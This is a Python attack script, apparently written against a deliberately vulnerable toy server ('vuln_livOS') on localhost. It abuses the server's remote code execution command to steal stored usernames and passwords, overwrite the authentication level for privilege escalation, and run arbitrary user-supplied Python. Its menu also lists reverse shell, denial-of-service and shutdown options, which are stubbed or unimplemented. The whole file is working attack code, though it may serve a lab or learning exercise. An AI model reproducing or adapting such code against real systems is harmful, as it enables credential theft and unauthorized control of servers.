import socket
import time

HOST = '127.0.0.1'
PORT = 12345

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

def exeres(code:str,client_socket):
    client_socket.settimeout(1)
    client_socket.sendall("exe".encode())
    d=client_socket.recv(1024).decode()
    client_socket.sendall(code.encode())
    try:
        respones = client_socket.recv(1024).decode()  # Response to code
        return respones
    except socket.timeout:
        print("Timeout.")
        return None
    
def exe(code:str,client_socket):
    client_socket.settimeout(1)
    client_socket.sendall("exe".encode())
    d=client_socket.recv(1024).decode()
    client_socket.sendall(code.encode())
    

def stealer(client_socket):
    
    # Receive the first response (user)
    user = exeres('client_sok.sendall(users[0].encode())',client_socket)

    password = exeres('client_sok.sendall(paswords[0].encode())',client_socket)

    return user, password

def privilege_escalation(client_socket):
    lev = int(input("Which auth level would you like (0-âˆž)? 0=better: "))
    
    # Set curauth on the server
    print(f"setting auth to {lev}")
    exe(f"curauth = {lev}", client_socket)
    
    print("Fetching curauth...")
    # Fetch curauth from the server and print it
    response = exeres('client_sok.sendall(str(curauth).encode())', client_socket)
    print(f"Current auth level: {response}")

def reverse_shell():
    pass
    

print("started atack suite for vuln_livOS")
try:
    while True:
        print("what atacks would your like to perform: \n"
              "1-login stealer \n"
              "2-priveleg escalation \n"
              "3-reverse shell \n"
              "4-run your own code \n"
              "5-dos\n"
              "6-server shutdonw\n")
        
        ein=int(input(""))

        if ein==1:
            print(stealer(client_socket))
        elif ein == 2:
            privilege_escalation(client_socket)
        elif ein == 3:
            pass
        elif ein == 4:
            print(exeres(input("your py code here:"),client_socket))

finally:
    client_socket.close()

